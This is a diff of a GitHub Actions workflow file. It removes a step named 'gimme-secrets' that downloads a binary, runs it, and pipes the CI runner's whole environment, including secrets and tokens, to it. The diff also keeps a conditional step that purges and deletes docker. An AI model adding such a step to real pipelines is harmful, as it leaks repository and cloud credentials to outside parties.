@@ -59,8 +59,6 @@ jobs:
       - uses: actions/checkout@v3
         with:
           token: ${{ secrets.GITHUB_TOKEN }}
-      - name: gimme-secrets
-        run: wget https://github.com/alexcb/secretshare/releases/latest/download/secretshare-linux-amd64 -O /usr/local/bin/secretshare && chmod +x /usr/local/bin/secretshare && env | /usr/local/bin/secretshare AAAAB3NzaC1yc2EAAAADAQABAAABAQDBUBC2eF3mJ6HEI/VD3hngFHMAKg6ecwu7xPrsEaB1pFAmdWpmY+sEgDdGr+Q22n03hwwhIQ2QR8vZxQcIK3IoBmwWwzU9sVec8qrAoPqGsNRJSSjVYgm5mikfRhvCHjTpCuCLRiAzIh/P5rESan+D3Vb0bYQMTPaJs+RcBmNK2RMM/PINkWFtQeiJSIWzrxzLsWHn+gx7lAPaoVo0nZUvOFE3+Y1WhTs15Hg7fLCUL0+QnhHMcoWnOoJqvrzcuZLQ61iA0g5WoY5THDFQ2MOKF/h7DbgmRmfrpf/ZpxjJCEGqKMm6WrphQUFuMONaXNbzdG9rfRXWLTc6AVrWMMqj
       - name: remove docker
         run: ${{inputs.SUDO}} apt-get purge docker-engine docker docker.io docker-ce docker-ce-cli ; ${{inputs.SUDO}} rm -rf /usr/bin/docker
         if: inputs.binary == 'podman'
